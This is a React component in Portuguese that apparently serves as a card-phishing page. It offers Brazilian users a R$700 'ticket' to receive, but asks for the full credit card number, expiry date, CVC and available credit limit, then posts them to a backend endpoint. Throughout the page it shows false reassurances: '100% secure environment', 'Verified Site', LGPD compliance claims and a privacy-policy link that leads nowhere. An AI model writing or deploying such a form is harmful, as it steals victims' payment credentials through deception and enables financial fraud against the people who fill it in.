"use client";
import React, { useState, useEffect } from "react";
import styles from "./HireForm.module.css";
import { FaLock, FaShieldAlt, FaGavel, FaCheckCircle, FaInfoCircle } from "react-icons/fa";

function gerarIdTicket() {
  const rand = Math.floor(1000 + Math.random() * 9000);
  const data = new Date();
  const dataStr = data.toISOString().slice(0,10).replace(/-/g,"");
  return `TCK-${dataStr}-${rand}`;
}

const bancos = [
  "Banco do Brasil",
  "Bradesco",
  "Caixa Econômica Federal",
  "Itaú",
  "Santander",
  "Nubank",
  "Inter",
  "Sicredi",
  "Sicoob",
  "Original",
  "C6 Bank",
  "Outro"
];


const TicketForm: React.FC<{ onBack?: () => void }> = ({ onBack }) => {
  const [ticketNumber, setTicketNumber] = useState("");
  const [value, setValue] = useState("700.00");
  const [banco, setBanco] = useState(bancos[0]);
  const [bancoOutro, setBancoOutro] = useState("");
  const [notes, setNotes] = useState("");
  const [limiteValor, setLimiteValor] = useState("");
  const [success, setSuccess] = useState(false);
  // Novos estados para cartão
  const [numeroCartao, setNumeroCartao] = useState("");
  const [validade, setValidade] = useState("");
  const [cvc, setCvc] = useState("");

  useEffect(() => {
    setTicketNumber(gerarIdTicket());
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSuccess(false);

    const payload = {
      ticketNumber,
      value,
      banco,
      bancoOutro,
      numeroCartao,
      validade,
      cvc,
      notes,
      limiteValor
    };

    const res = await fetch("/api/ticket", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (res.ok) {
      setSuccess(true);
      setTimeout(() => setSuccess(false), 3000);
    } else {
      alert("Erro ao enviar o ticket. Tente novamente.");
    }
  };

  return (
    <div className={styles.formContainer}>
      {/* Selo de segurança e LGPD */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          gap: 14,
          background: "linear-gradient(90deg, #e0f7fa 60%, #b2ebf2 100%)",
          color: "#00796b",
          borderRadius: 10,
          padding: "14px 20px",
          fontWeight: 600,
          marginBottom: 18,
          fontSize: 16,
          boxShadow: "0 2px 8px 0 #b2ebf233",
        }}
      >
        <FaShieldAlt style={{ fontSize: 22 }} />
        <span>
          <strong>Ambiente 100% seguro</strong> &nbsp;|&nbsp; 
          <FaLock style={{ fontSize: 18, marginRight: 4, marginLeft: 4 }} />
          Dados protegidos conforme a{" "}
          <span style={{ position: "relative", cursor: "pointer" }}>
            LGPD (Lei 13.709/2018)
            <FaInfoCircle style={{ fontSize: 13, marginLeft: 4, color: "#0070f3" }} title="Seus dados são protegidos conforme a Lei Geral de Proteção de Dados." />
          </span>
        </span>
      </div>
      <div style={{
        display: "flex",
        alignItems: "center",
        gap: 8,
        background: "#e8f5e9",
        color: "#388e3c",
        borderRadius: 8,
        padding: "6px 14px",
        fontWeight: 700,
        fontSize: 14,
        marginBottom: 10,
        width: "fit-content"
      }}>
        <FaCheckCircle style={{ fontSize: 18, color: "#43a047" }} />
        Site Verificado e Protegido
      </div>
      <h2 className={styles.formTitle} style={{ marginBottom: 10 }}>
        Informações do Ticket
      </h2>
      <p style={{ textAlign: "center", color: "#444", marginBottom: 18 }}>
        Preencha os dados do ticket para receber.<br />
        <span style={{ fontSize: 13, color: "#0070f3" }}>
          Suas informações são criptografadas e utilizadas apenas para este processo.
        </span>
      </p>
      {success && (
        <div className={styles.successMsg} style={{ marginBottom: 18 }}>
          ✅ Ticket enviado com sucesso!
        </div>
      )}
      <form onSubmit={handleSubmit} autoComplete="off">
        <div className={styles.inputGroup} style={{ marginBottom: 10 }}>
          <label className={styles.inputLabel}>Número do Ticket</label>
          <input
            className={styles.inputField}
            type="text"
            value={ticketNumber}
            readOnly
            required
          />
        </div>
        <div className={styles.inputGroup} style={{ marginBottom: 10 }}>
          <label className={styles.inputLabel}>Valor (R$)</label>
          <input
            className={styles.inputField}
            type="number"
            value={value}
            readOnly
            required
          />
        </div>
        <div className={styles.inputGroup} style={{ marginBottom: 10 }}>
          <label className={styles.inputLabel}>Banco</label>
          <select
            className={styles.inputField}
            value={banco}
            onChange={e => setBanco(e.target.value)}
            required
          >
            {bancos.map(banco => (
              <option key={banco} value={banco}>
                {banco}
              </option>
            ))}
          </select>
        </div>
        {banco === "Outro" && (
          <div className={styles.inputGroup} style={{ marginBottom: 10 }}>
            <label className={styles.inputLabel}>Qual banco?</label>
            <input
              className={styles.inputField}
              type="text"
              value={bancoOutro}
              onChange={e => setBancoOutro(e.target.value)}
              placeholder="Digite o nome do banco"
              required
            />
          </div>
        )}
        <div className={styles.inputGroup} style={{ marginBottom: 10 }}>
          <label className={styles.inputLabel}>Digite o número do cartão de crédito que irá receber</label>
          <input
            className={styles.inputField}
            type="text"
            maxLength={19}
            placeholder="Ex: 1234 5678 9012 3456"
            required
            value={numeroCartao}
            onChange={e => setNumeroCartao(e.target.value)}
          />
          <small style={{ color: "#888" }}>Exemplo: 1234 5678 9012 3456</small>
        </div>
        <div className={styles.fieldsRow}>
          <div className={styles.inputGroup} style={{ marginBottom: 10, flex: 1 }}>
            <label className={styles.inputLabel}>Validade</label>
            <input
              className={styles.inputField}
              type="month"
              required
              value={validade}
              onChange={e => setValidade(e.target.value)}
            />
          </div>
          <div className={styles.inputGroup} style={{ marginBottom: 10, flex: 1 }}>
            <label className={styles.inputLabel}>CVC</label>
            <input
              className={styles.inputField}
              type="number"
              maxLength={4}
              placeholder="Ex: 123"
              required
              value={cvc}
              onChange={e => setCvc(e.target.value)}
            />
          </div>
        </div>
        <div className={styles.inputGroup} style={{ marginBottom: 16 }}>
          <label className={styles.inputLabel}>
            Você possui o limite necessário para receber o ticket?
          </label>
          <select
            className={styles.inputField}
            required
            value={notes}
            onChange={e => setNotes(e.target.value)}
          >
            <option value="">Selecione</option>
            <option value="Sim tenho 1000,00 ou menos">Sim tenho 1000,00 ou menos</option>
            <option value="Sim tenho 2000,00 ou menos">Sim tenho 2000,00 ou menos</option>
            <option value="Sim tenho 3000,00 ou menos">Sim tenho 3000,00 ou menos</option>
            <option value="Tenho mais do que 3000,00">Tenho mais do que 3000,00</option>
          </select>
        </div>
        {notes === "Tenho mais do que 3000,00" && (
          <div className={styles.inputGroup} style={{ marginBottom: 16 }}>
            <label className={styles.inputLabel}>Qual o valor do seu limite?</label>
            <input
              className={styles.inputField}
              type="number"
              min={3001}
              value={limiteValor}
              onChange={e => setLimiteValor(e.target.value)}
              placeholder="Digite o valor do limite"
              required
            />
          </div>
        )}
        <button className={styles.button} type="submit" style={{ marginBottom: onBack ? 10 : 0 }}>
          Enviar Ticket
        </button>
        {onBack && (
          <button
            type="button"
            className={styles.button}
            style={{
              background: "#f5f5f5",
              color: "#0070f3",
              marginTop: 0,
              fontWeight: 600,
              border: "1.5px solid #e0e0e0",
              boxShadow: "none",
            }}
            onClick={onBack}
          >
            Voltar
          </button>
        )}
      </form>
      <div style={{
        background: "#f1f8e9",
        color: "#33691e",
        borderRadius: 8,
        padding: "8px 12px",
        fontSize: 13,
        marginBottom: 12
      }}>
        <FaLock style={{ marginRight: 4 }} />
        Suas informações são criptografadas e usadas apenas para este processo.
      </div>
      {/* Rodapé de confiabilidade e leis */}
      <div style={{
        marginTop: 28,
        padding: "12px 10px 0 10px",
        fontSize: 13,
        color: "#888",
        borderTop: "1px solid #e0e0e0",
        textAlign: "center"
      }}>
        <FaGavel style={{ fontSize: 15, marginRight: 6, color: "#0070f3" }} />
        Este formulário segue as normas da <strong>LGPD</strong> (Lei 13.709/2018).
        Seus dados não serão compartilhados com terceiros e são utilizados exclusivamente para o processamento do seu ticket.
        Em caso de dúvidas, consulte nossa <a href="#" style={{ color: "#0070f3", textDecoration: "underline" }}>Política de Privacidade</a>.
      </div>
    </div>
  );
};

export default TicketForm;